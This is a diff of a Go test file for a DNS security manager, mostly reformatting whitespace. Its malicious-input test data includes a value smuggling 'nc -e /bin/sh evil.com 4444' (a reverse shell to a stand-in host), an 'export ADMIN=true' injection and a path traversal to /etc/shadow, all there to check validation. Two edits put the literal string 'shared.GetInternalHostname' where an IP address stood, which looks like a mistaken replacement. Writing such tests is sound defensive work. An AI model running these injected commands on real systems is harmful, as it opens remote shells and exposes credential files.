@@ -83,7 +83,7 @@ func TestDNSSecurity(t *testing.T) {
 
 		// Test suspicious IP patterns
 		suspiciousIPs := []string{
-			"127.0.0.1",
+			"shared.GetInternalHostname",
 			"255.255.255.255",
 		}
 
@@ -91,9 +91,9 @@ func TestDNSSecurity(t *testing.T) {
 			err := dnsSecurityManager.validateSecureDNSRequest("test.example.com", ip, "test-client")
 			assert.Error(t, err, "Suspicious IP should fail validation: %s", ip)
 			// The error could be from either suspicious range or basic IP validation
-			assert.True(t, 
-				strings.Contains(err.Error(), "suspicious range") || 
-				strings.Contains(err.Error(), "not allowed"),
+			assert.True(t,
+				strings.Contains(err.Error(), "suspicious range") ||
+					strings.Contains(err.Error(), "not allowed"),
 				"Error should mention suspicious range or not allowed: %s", err.Error())
 		}
 	})
@@ -109,9 +109,9 @@ func TestDNSSecurity(t *testing.T) {
 			err := dnsSecurityManager.validateSecureDNSRequest(domain, "1.2.3.4", "test-client")
 			assert.Error(t, err, "Blocked domain should fail validation: %s", domain)
 			// The error could be from either suspicious pattern or blocked domain check
-			assert.True(t, 
-				strings.Contains(err.Error(), "blocked by security policy") || 
-				strings.Contains(err.Error(), "suspicious pattern"),
+			assert.True(t,
+				strings.Contains(err.Error(), "blocked by security policy") ||
+					strings.Contains(err.Error(), "suspicious pattern"),
 				"Error should mention either blocked policy or suspicious pattern: %s", err.Error())
 		}
 	})
@@ -139,17 +139,17 @@ func TestDNSSecurity(t *testing.T) {
 		// Create a fresh security manager to avoid counting events from previous tests
 		freshClient := &HecateClient{rc: rc}
 		freshSecurityManager := NewDNSSecurityManager(freshClient)
-		
+
 		// Record some events on the fresh manager
 		monitor := freshSecurityManager.monitor
-		
+
 		monitor.RecordSecurityEvent(DNSSecurityEvent{
 			EventType: "test_event_1",
 			Severity:  "high",
 		})
-		
+
 		monitor.RecordSecurityEvent(DNSSecurityEvent{
-			EventType: "test_event_2", 
+			EventType: "test_event_2",
 			Severity:  "info",
 		})
 
@@ -170,7 +170,7 @@ func TestDNSSecurity(t *testing.T) {
 
 		for _, input := range maliciousInputs {
 			sanitized := SanitizeInput(input)
-			
+
 			// Should not contain dangerous characters
 			assert.NotContains(t, sanitized, ";", "Should not contain semicolon")
 			assert.NotContains(t, sanitized, "&", "Should not contain ampersand")
@@ -213,7 +213,7 @@ func TestDNSSecurity(t *testing.T) {
 		// Test environment variable validation
 		maliciousEnvVars := map[string]string{
 			"DOMAIN":        "example.com; export ADMIN=true",
-			"BACKEND_IP":    "127.0.0.1 && nc -e /bin/sh evil.com 4444",
+			"BACKEND_IP":    "shared.GetInternalHostname && nc -e /bin/sh evil.com 4444",
 			"SSL_CERT_PATH": "/etc/ssl/certs/../../etc/shadow",
 		}
 
